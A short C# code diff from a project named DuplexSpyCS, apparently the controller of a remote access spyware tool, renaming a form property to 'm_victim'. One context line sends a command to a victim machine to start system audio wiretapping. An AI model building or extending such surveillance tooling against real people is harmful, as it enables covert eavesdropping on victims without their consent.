@@ -454,7 +454,7 @@ namespace DuplexSpyCS
 
             using (frmManager f = new frmManager(v)
             {
-                v = v,
+                m_victim = v,
             })
             {
                 Action actCompleted = () =>
@@ -536,7 +536,7 @@ namespace DuplexSpyCS
 
             using (frmManager f = new frmManager(v)
             {
-                v = v,
+                m_victim = v,
             })
             {
                 v.SendCommand($"audio|wiretap|system|on|stop|Audio|{comboBox2.SelectedIndex}");
